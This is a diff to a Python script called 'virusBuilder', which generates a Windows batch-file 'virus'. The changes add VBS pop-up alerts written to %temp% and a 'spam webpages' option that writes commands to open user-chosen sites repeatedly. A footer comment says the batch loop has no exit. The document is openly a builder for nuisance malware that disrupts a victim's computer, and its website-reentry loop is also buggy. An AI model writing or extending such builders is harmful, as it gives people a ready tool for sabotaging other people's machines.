@@ -1,6 +1,6 @@
 import os
 #Title
-print("virusBuilder 1.0.1")
+print("virusBuilder 1.0.2")
 print("by VulnerabilityVigilante")
 print("\n")
 
@@ -49,7 +49,6 @@ with open(file_path, "w") as file:
 
 
 
-
 #Custom Alert Box Option
 print("")
 customAlertBox = input("Would you like to add a custom alert box? (y/n) ")
@@ -70,7 +69,10 @@ if customAlertBox == 'y':
     #User confirms body of alert
     if alertBodyConfirmation == 'y':
         with open(file_path, "a") as file:
-            file.write("msg * " + alertBody + "\n")
+            file.write("echo msgbox ")
+            file.write("\"" + alertBody + "\" > %temp%\\tmp.vbs\n")
+            file.write("start %temp%\\tmp.vbs\n")
+
     #If user does not confirm body of alert
     else:
         #Loop until user is happy with input
@@ -99,9 +101,63 @@ else:
     if alertBoxOption == '1':
         print("Using default message")
         with open(file_path, "a") as file:
-            file.write("msg * click OK \n")
+            file.write("echo msgbox \"Click OK\" > %temp%\\tmp.vbs\n")
+            file.write("start %temp%\\tmp.vbs\n")
     else:
         print("Understood. Alert boxes will not be included.")
+
+
+#Browser Spam Functionality
+browserOption = input("Would you like to spam webpages? (y/n) ")
+#Weed out exceptions
+while browserOption != 'y' and browserOption != 'n':
+    print("Please enter either y or n")
+    browserOption = input("Would you like to spam webpages? (y/n) ")
+    print()
+#If user wants browser spam
+if browserOption == 'y':
+    webpageAmount = int(input("How many different kinds of websites would you like the virus to open? "))
+    web_list = []
+    print()
+    print("Make sure to format the websites in the following format:")
+    print("google.com")
+    for i in range(webpageAmount):
+        print()
+        website = "https://www."
+        websiteInput = input("Webpage " + str(i) + ": ")
+        website += websiteInput
+        web_list.append(website)
+
+    #Confirm websites
+    print()
+    print(web_list)
+    web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
+    while web_confirmation != 'y' and web_confirmation != 'n': #Weed out non-permitted answers
+        print("Please enter either y or n")
+        print()
+        print(web_list)
+        web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
+    
+    #If user does not want inputted websites
+    while web_confirmation == 'n':
+        print()
+        print("Make sure to format the websites in the following format:")
+        print("google.com")
+        for i in range(webpageAmount):
+            print()
+            website = "https://www."
+            websiteInput = input("Webpage " + str(i + 1) + ": ")
+            website += websiteInput
+            web_list.append(website)
+    
+    #if user confirms websites, write to batch file
+    if web_confirmation == 'y':
+        with open(file_path, "a") as file:
+            for i in web_list:
+                file.write("explorer ")
+                file.write("\"")
+                file.write(i)
+                file.write("\"\n")
 
 
 #Batchfile footer to finish loop with no exit
